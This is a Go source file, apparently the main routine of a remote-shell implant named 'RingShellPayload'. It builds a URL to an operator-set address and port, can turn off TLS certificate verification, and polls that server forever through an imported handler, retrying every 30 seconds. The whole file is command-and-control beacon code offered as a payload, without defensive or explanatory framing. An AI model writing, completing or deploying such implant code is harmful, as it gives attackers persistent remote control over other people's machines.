package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"

	"github.com/MustafaAbdulazizHamza/RingShellPayload/Handler"
)

func main() {
	scheme := "http"
	if useHTTPS {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%d", scheme, address, port)

	var client *http.Client
	if useHTTPS && !tlsVerify {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
	} else {
		client = &http.Client{Timeout: 30 * time.Second}
	}

	for {
		if err := Handler.Handle(client, baseURL); err != nil {
			time.Sleep(30 * time.Second)
			continue
		}
	}
}
